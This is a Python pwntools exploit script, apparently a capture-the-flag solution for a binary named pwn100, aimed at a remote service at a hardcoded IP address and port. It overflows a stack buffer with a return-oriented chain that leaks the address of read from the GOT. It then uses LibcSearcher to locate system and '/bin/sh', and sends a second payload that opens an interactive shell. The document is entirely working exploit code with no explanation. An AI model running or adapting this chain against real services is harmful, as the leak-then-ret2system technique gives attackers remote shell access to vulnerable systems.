from pwn import *
from LibcSearcher import *

# p = process("/home/nop/Desktop/pwn100")
p = remote('149.129.103.121',10006)
elf = ELF("/home/nop/Desktop/pwn100")

read_got = elf.got['read']
puts_plt = elf.symbols['puts']
log.info("read_got = %#x, puts_plt = %#x"%(read_got,puts_plt))

start = 0x400550
pop_rdi = 0x0400763

payload = 'A'*0x48
payload += p64(pop_rdi) # transfer the read@got to puts
payload += p64(read_got)
payload += p64(puts_plt)    # call puts
payload += p64(start)   # set the return address
payload = payload.ljust(200,'B')    # pading the length of paylaod to 200

print 'sending payload...'
for i in range(200):
    p.send(payload[i])
    if i==199:
        print "work done!"
    sleep(0.1)
p.recvuntil("bye~\n")
read_addr = u64(p.recv()[:6].ljust(8,'\x00'))
log.info("read_addr = %#x",read_addr)

libc = LibcSearcher('read',read_addr)
lib_base = read_addr - libc.dump('read')
system_addr = lib_base + libc.dump('system')
binsh_addr = lib_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr,binsh_addr))

payload1 = 'A'*0x48
payload1 += p64(pop_rdi)    # transfer the binsh_addr to system
payload1 += p64(binsh_addr)
payload1 += p64(system_addr)    # call system to get shell
payload1 += p64(start)  # set the return address
payload1 = payload1.ljust(200,'B')

print 'sending payload...'
for i in range(200):
    p.send(payload1[i])
    if i==199:
        print "work done!"
    sleep(0.1)

sleep(3)
p.interactive()
